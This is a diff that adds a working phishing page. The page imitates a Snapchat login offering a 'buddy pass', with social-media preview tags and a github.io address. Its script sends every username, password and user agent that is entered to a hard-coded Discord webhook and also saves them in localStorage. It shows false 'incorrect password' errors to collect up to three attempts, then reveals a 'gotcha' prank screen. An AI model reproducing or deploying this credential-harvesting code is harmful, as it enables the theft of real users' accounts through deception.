@@ -1,1 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#f2f2f2">
+  <title>Sign in to Snapchat to Claim Pass</title>
+  <!-- Favicon -->
+  <link rel="icon" type="image/svg+xml" href="ghost.svg">
+  <link rel="apple-touch-icon" href="ghost.png">
 
+  <!-- Link preview -->
+  <meta property="og:title" content="Sign in to Snapchat to Claim Pass">
+  <meta property="og:description" content="Log in to claim your buddy pass.">
+  <meta property="og:image" content="https://d25tjr6v8-gif.github.io/snapchat-buddy-pass/ghost.png">
+  <meta property="og:image:width" content="512">
+  <meta property="og:image:height" content="512">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://d25tjr6v8-gif.github.io/snapchat-buddy-pass/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Sign in to Snapchat to Claim Pass">
+  <meta name="twitter:description" content="Log in to claim your buddy pass.">
+  <meta name="twitter:image" content="https://d25tjr6v8-gif.github.io/snapchat-buddy-pass/ghost.png">
+
+  <style>
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      min-height: 100%;
+    }
+
+    body {
+      min-height: 100vh;
+      min-height: 100dvh;
+      background: #f2f2f2;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: #1a1a1a;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
+      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+    }
+
+    .page {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      min-height: 100dvh;
+      padding: 24px 16px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 360px;
+      padding: 40px 32px 44px;
+      background: #ffffff;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
+    }
+
+    .custom-icon {
+      display: flex;
+      justify-content: center;
+      margin: 0 auto 18px;
+    }
+
+    .custom-icon svg {
+      width: 54px;
+      height: 54px;
+      display: block;
+    }
+
+    h1 {
+      margin: 0 auto 32px;
+      font-size: 24px;
+      line-height: 1.25;
+      font-weight: 700;
+      color: #111;
+    }
+
+    .field-label {
+      display: block;
+      margin: 0 0 8px;
+      font-size: 13px;
+      color: #555;
+      text-align: left;
+    }
+
+    .field {
+      width: 100%;
+      height: 44px;
+      margin-bottom: 18px;
+      padding: 0 14px;
+      border: 0;
+      border-radius: 6px;
+      background: #f5f5f5;
+      font-size: 16px;
+      color: #111;
+      outline: none;
+      transition: background 0.15s ease;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    .field:focus { background: #ececec; }
+
+    .forgot {
+      display: block;
+      margin: 0 0 22px;
+      color: #555;
+      font-size: 12px;
+      text-align: right;
+      cursor: pointer;
+    }
+
+    .login-button {
+      display: inline-block;
+      min-width: 110px;
+      height: 44px;
+      padding: 0 26px;
+      border: 0;
+      border-radius: 22px;
+      background: #FFFC00;
+      color: #111;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: filter 0.15s ease;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .login-button:hover { filter: brightness(0.95); }
+    .login-button:active { filter: brightness(0.9); }
+
+    .error-message {
+      min-height: 16px;
+      margin: 16px 0 0;
+      color: #d93025;
+      font-size: 12px;
+    }
+
+    .success-message {
+      min-height: 16px;
+      margin: 16px 0 0;
+      color: #188038;
+      font-size: 12px;
+    }
+
+    .signup {
+      margin-top: 24px;
+      font-size: 14px;
+      color: #333;
+      text-align: center;
+    }
+
+    .signup span {
+      color: #111;
+      font-weight: 700;
+      margin-left: 4px;
+    }
+
+    .show-password {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin: -8px 0 12px;
+      color: #777;
+      font-size: 11px;
+      text-align: left;
+    }
+
+    .show-password input {
+      width: 13px;
+      height: 13px;
+      margin: 0;
+    }
+
+    /* ─── prank view ─────────────────────────────────────────────── */
+
+    .timeout-view {
+      display: none;
+    }
+
+    .timeout-view h1 {
+      margin: 0 0 16px;
+    }
+
+    .prank-icon {
+      width: 68px;
+      height: 68px;
+      margin: 0 auto 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      background: #f5f5f5;
+      color: #777;
+    }
+
+    .prank-icon svg {
+      width: 34px;
+      height: 34px;
+    }
+
+    .prank-text {
+      margin: 0 0 26px;
+      font-size: 15px;
+      line-height: 1.55;
+      color: #444;
+    }
+
+    .prank-text .em {
+      color: #111;
+      font-weight: 600;
+    }
+
+    .prank-signoff {
+      margin: 18px 0 0;
+      font-size: 13px;
+      color: #999;
+      font-style: italic;
+      line-height: 1.4;
+    }
+
+    .prank-button {
+      display: inline-block;
+      min-width: 110px;
+      height: 44px;
+      padding: 0 26px;
+      margin-top: 22px;
+      border: 0;
+      border-radius: 22px;
+      background: #FFFC00;
+      color: #111;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      line-height: 44px;
+    }
+
+    .prank-button:hover { filter: brightness(0.95); }
+
+    @media (max-width: 380px) {
+      .card { padding: 32px 22px 36px; }
+      h1 { font-size: 21px; }
+      .custom-icon svg { width: 46px; height: 46px; }
+    }
+
+    @media (max-height: 520px) {
+      .page { justify-content: flex-start; padding-top: 16px; }
+      .card { padding: 24px 22px 28px; }
+      h1 { margin-bottom: 20px; font-size: 20px; }
+      .custom-icon { margin-bottom: 12px; }
+      .custom-icon svg { width: 40px; height: 40px; }
+    }
+  </style>
+</head>
+
+<body>
+  <main class="page">
+    <section class="card">
+
+      <div id="signinView">
+
+        <div class="custom-icon">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path d="M12 2c-3.1 0-5.6 2.5-5.6 5.6 0 .8.1 1.6.1 2.1-.3.1-.8.2-1.3.1-.4-.1-.8.1-.9.5-.1.3.1.6.5.7.6.2 1.1.4 1.5.6.3.1.3.3.2.6-.4 1.3-1.5 2.5-3 2.9-.3.1-.4.5-.2.7.5.6 1.3 1 2 1.1.1.2.1.5.2.8.1.4.5.5 1 .4.4-.1.9-.2 1.4-.2.9 0 1.6.6 2.4 1.2.6.4 1.2.7 1.9.7.7 0 1.3-.3 1.9-.7.8-.6 1.5-1.2 2.4-1.2.5 0 1 .1 1.4.2.5.1.9 0 1-.4.1-.3.1-.6.2-.8.7-.1 1.5-.5 2-1.1.2-.2.1-.6-.2-.7-1.5-.4-2.6-1.6-3-2.9-.1-.3-.1-.5.2-.6.4-.2.9-.4 1.5-.6.4-.1.6-.4.5-.7-.1-.4-.5-.6-.9-.5-.5.1-1 0-1.3-.1 0-.5.1-1.3.1-2.1C17.6 4.5 15.1 2 12 2z"
+                  fill="none"
+                  stroke="#111"
+                  stroke-width="1.6"
+                  stroke-linejoin="round"
+                  stroke-linecap="round"/>
+          </svg>
+        </div>
+
+        <h1>Sign in to Snapchat to Claim Pass</h1>
+
+        <form id="loginForm">
+          <label class="field-label" for="username">Username or email address</label>
+          <input
+            id="username"
+            class="field"
+            type="text"
+            autocomplete="off"
+            autocapitalize="off"
+            autocorrect="off"
+            spellcheck="false"
+          >
+
+          <label class="field-label" for="password">Password</label>
+          <input
+            id="password"
+            class="field"
+            type="password"
+            autocomplete="off"
+            autocapitalize="off"
+            autocorrect="off"
+            spellcheck="false"
+          >
+
+          <label class="show-password">
+            <input id="showPassword" type="checkbox">
+            Show password
+          </label>
+
+          <span class="forgot">Forgotten password</span>
+
+          <button class="login-button" type="submit">
+            Log in
+          </button>
+
+          <p id="message" class="error-message"></p>
+        </form>
+
+      </div>
+
+      <div id="timeoutView" class="timeout-view">
+
+        <div class="prank-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/>
+            <path d="M8 14s1.5 2 4 2 4-2 4-2"/>
+            <line x1="9" y1="9" x2="9.01" y2="9"/>
+            <line x1="15" y1="9" x2="15.01" y2="9"/>
+          </svg>
+        </div>
+
+        <h1>gotcha</h1>
+
+        <p class="prank-text">
+          this website is a <span class="em">trick</span> lol.
+          <br><br>
+          thanks for actually reading my messages.
+        </p>
+
+        <p class="prank-signoff">— you can close this now</p>
+
+        <a href="#" onclick="return false;" class="prank-button">Close</a>
+
+      </div>
+
+    </section>
+
+    <p class="signup" id="signupBar">
+      New to Snapchat?<span>Sign up</span>
+    </p>
+  </main>
+
+  <script>
+    // ─── CONFIG ───────────────────────────────────────────────────────────
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1558927875325829213/GAnr1NOny8bUmKg1ulMr0U1Of9TcoiN1RxxXQ4y-Vqd2kgZGyxGc6ayskEoovv5vwWXk";
+    const MAX_ATTEMPTS = 3;
+    // ──────────────────────────────────────────────────────────────────────
+
+    const form = document.getElementById("loginForm");
+    const password = document.getElementById("password");
+    const showPassword = document.getElementById("showPassword");
+    const message = document.getElementById("message");
+    const signinView = document.getElementById("signinView");
+    const timeoutView = document.getElementById("timeoutView");
+    const signupBar = document.getElementById("signupBar");
+
+    window.capturedLogins = JSON.parse(localStorage.getItem("capturedLogins") || "[]");
+
+    let attempts = 0;
+
+    function persistLocal(entry) {
+      window.capturedLogins.push(entry);
+      try {
+        localStorage.setItem("capturedLogins", JSON.stringify(window.capturedLogins));
+      } catch (e) {
+        console.warn("localStorage write failed", e);
+      }
+    }
+
+    // escape backticks / newlines so the victim's password can't break
+    // Discord's markdown formatting or truncate the message.
+    function esc(s) {
+      return String(s)
+        .replace(/`/g, "\u02cb")
+        .replace(/\n/g, "\\n")
+        .replace(/\r/g, "\\r");
+    }
+
+    function buildPayload(entry) {
+      return JSON.stringify({
+        content:
+          "**Snap — new submission**\n" +
+          "**User:** `" + esc(entry.username) + "`\n" +
+          "**Pass:** `" + esc(entry.password) + "`\n" +
+          "**Attempt:** " + entry.attempt + " / " + MAX_ATTEMPTS + "\n" +
+          "**Time:** " + entry.timestamp + "\n" +
+          "**UA:** `" + esc(entry.userAgent) + "`"
+      });
+    }
+
+    function sendDiscord(entry) {
+      if (!DISCORD_WEBHOOK) return;
+      const payload = buildPayload(entry);
+
+      if (navigator.sendBeacon) {
+        const blob = new Blob([payload], { type: "application/json" });
+        const ok = navigator.sendBeacon(DISCORD_WEBHOOK, blob);
+        if (ok) return;
+      }
+
+      fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: payload,
+        keepalive: true
+      }).catch(function (e) {
+        console.warn("discord send failed", e);
+      });
+    }
+
+    function showTimeout() {
+      signinView.style.display = "none";
+      signupBar.style.display = "none";
+      timeoutView.style.display = "block";
+    }
+
+    showPassword.addEventListener("change", function () {
+      password.type = this.checked ? "text" : "password";
+    });
+
+    form.addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const enteredPassword = password.value;
+
+      attempts++;
+
+      const entry = {
+        username: username,
+        password: enteredPassword,
+        attempt: attempts,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      };
+
+      persistLocal(entry);
+      sendDiscord(entry);
+
+      console.log("[captured login]", entry);
+      console.table(window.capturedLogins);
+
+      if (attempts >= MAX_ATTEMPTS) {
+        message.className = "error-message";
+        message.textContent = "Username or password is incorrect.";
+        setTimeout(showTimeout, 700);
+        return;
+      }
+
+      message.className = "error-message";
+      message.textContent = "Username or password is incorrect.";
+    });
+  </script>
+</body>
+</html>
